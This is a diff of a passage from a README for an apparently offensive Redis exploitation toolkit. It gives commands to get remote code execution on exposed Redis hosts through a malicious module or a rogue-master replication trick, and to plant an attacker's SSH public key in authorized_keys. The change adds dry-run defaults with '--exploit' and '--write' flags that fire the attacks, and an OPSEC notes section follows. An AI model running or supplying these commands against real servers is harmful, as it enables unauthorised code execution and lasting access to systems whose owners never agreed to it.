@@ -41,11 +41,12 @@ The detector (`redis-quickwin.sh`) classifies each host:
 # 2. Build the module once
 ( cd module && make )
 
-# 3. Module-RCE the CRITICAL hosts (auto-uses rogue master if direct write fails)
-./redis-rce-module.sh --target 10.0.0.20:6379 --cmd 'id; uname -a; hostname'
+# 3. Module-RCE the CRITICAL hosts (auto-uses rogue master if direct write fails).
+#    Default behaviour is DRY-RUN (prints plan, exits 0). Add --exploit to fire.
+./redis-rce-module.sh --target 10.0.0.20:6379 --cmd 'id; uname -a; hostname' --exploit
 
-# 4. SSH key drop on HIGH hosts
-./redis-rce-ssh.sh --target 10.0.0.20:6379 --key ~/.ssh/id_rsa.pub
+# 4. SSH key drop on HIGH hosts. Add --write to actually mutate authorized_keys.
+./redis-rce-ssh.sh --target 10.0.0.20:6379 --key ~/.ssh/id_rsa.pub --write
 ```
 
 ## OPSEC notes
